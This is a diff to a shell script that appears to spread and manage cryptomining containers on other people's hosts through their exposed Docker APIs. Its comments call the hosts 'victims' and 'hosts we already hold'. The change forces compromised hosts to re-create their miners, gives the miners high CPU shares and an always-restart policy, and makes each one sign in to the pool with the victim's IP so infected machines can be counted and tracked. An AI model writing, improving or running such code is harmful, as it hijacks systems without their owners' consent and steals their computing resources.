@@ -304,11 +304,19 @@ dock_one() {
             # Config drift: we only re-create a container when it is missing, so a
             # host infected before the CpuShares/thread-hint change would keep its
             # throttled container forever. Compare, and force a re-create if stale.
-            shares=$(curl -fsS $opts --max-time 8 "$b/containers/$have/json" 2>/dev/null \
-                     | grep -o '"CpuShares":[0-9]*' | head -1 | cut -d: -f2)
+            # Also re-create when the container still signs in with the shared rig
+            # id: without that the per-host census never materialises on hosts we
+            # already hold.
+            cj=$(curl -fsS $opts --max-time 8 "$b/containers/$have/json" 2>/dev/null) || cj=""
+            shares=$(printf '%s' "$cj" | grep -o '"CpuShares":[0-9]*' | head -1 | cut -d: -f2)
+            hasip=$(printf '%s' "$cj" | grep -c "\"$ip\"")
             if [ -n "${shares:-}" ] && [ "$shares" -lt 2048 ]; then
                 curl -fsS $opts --max-time 20 -X DELETE "$b/containers/$have?force=1" >/dev/null 2>&1 || :
                 echo "dock: $ip stale container (CpuShares $shares), re-creating"
+                have=""
+            elif [ "${hasip:-0}" = 0 ]; then
+                curl -fsS $opts --max-time 20 -X DELETE "$b/containers/$have?force=1" >/dev/null 2>&1 || :
+                echo "dock: $ip container has no per-host rig id, re-creating"
                 have=""
             fi
         fi
@@ -346,8 +354,17 @@ dock_one() {
     # NOTE the -f on the create/start checks: without it a 404 body
     # ({"message":"page not found"}) still exits 0 and a failed start is
     # recorded as a deploy.
+    #
+    # Per-host rig id. Every victim used to sign in with the same password, so the
+    # pool reported exactly one rig ("node") no matter how many machines were
+    # mining - and "how many are we on" could only be guessed at. Signing in as the
+    # host's own IP turns the pool's identifiers endpoint into a live machine
+    # census AND gives per-machine hashrate, i.e. the only way to see which hosts
+    # actually produce instead of which ones merely answered.
+    CMDH=$(printf '%s' "$CMDS" | sed "s|\"-p\",\"[^\"]*\"|\"-p\",\"$ip\"|")
+    BODYH=$(printf '%s' "$BODY" | sed "s|\"Cmd\":\[[^]]*\]|\"Cmd\":[$CMDH]|")
     if r=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
-                -H "Content-Type: application/json" -d "$BODY" 2>/dev/null); then
+                -H "Content-Type: application/json" -d "$BODYH" 2>/dev/null); then
         id=$(printf '%s' "$r" | grep -oE '"Id":"[0-9a-f]{20,80}"' | head -1 | cut -d'"' -f4)
         cid=${id:-$name}
         # No -f here: docker answers a good start with 204 and an empty body, and a
@@ -368,8 +385,9 @@ dock_one() {
                  "$b/containers/$cid?force=1" >/dev/null 2>&1 || :
             body_min="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG}"
             body_min="$body_min,\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
+            body_minH=$(printf '%s' "$body_min" | sed "s|\"Cmd\":\[[^]]*\]|\"Cmd\":[$CMDH]|")
             if r2=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
-                          -H "Content-Type: application/json" -d "$body_min" 2>/dev/null); then
+                          -H "Content-Type: application/json" -d "$body_minH" 2>/dev/null); then
                 id2=$(printf '%s' "$r2" | grep -oE '"Id":"[0-9a-f]{20,80}"' | head -1 | cut -d'"' -f4)
                 err2=$(curl -sS $opts --max-time 25 -X POST \
                            "$b/containers/${id2:-$name}/start" 2>/dev/null) || err2="curl failed"
